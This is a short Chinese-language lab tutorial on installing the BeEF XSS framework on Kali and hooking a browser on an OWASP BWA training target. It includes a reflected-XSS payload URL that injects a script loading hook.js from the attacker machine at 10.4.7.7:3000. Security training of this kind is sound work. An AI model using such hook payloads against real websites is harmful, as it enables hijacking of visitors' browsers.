# 04 xss——BeEF-xss

## 安装

该工具安装在kali系统下。

```bash
sudo apt-get install beef-xss -y
```

修改配置文件中的用户名和密码，否则启动会失败。

```bash
sudo vim /etc/beef-xss/config.yaml

beef:
	........
	
	credentials:
		user:    "root"
		passwd:  "1"

	........
```

设置软连接

```bash
sudo ln -s /usr/share/beef-xss/beef /usr/bin/beef
```

启动

```bash
sudo beef
```

或者通过下面方式启动

```bash
sudo beef-xss                                                        
```

进入页面

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210820173842.png)

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210820174337.png)

## 使用示例

可以通过`http://10.4.7.7:3000/hook.js`查看hook.js源码。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210820182335.png)

查看owaspbwa top 10靶机相关页面的状态

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210820180709.png)

构造payload并开始攻击

```
http://10.4.7.5/owaspbricks/content-2/index.php?user=harry%3Cscript%20src=http://10.4.7.7:3000/hook.js%3E%3C/script%3E
```

进入beef页面查看结果

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210820182718.png)

可以看到在这里出现了`10.4.7.5`的目标机器。

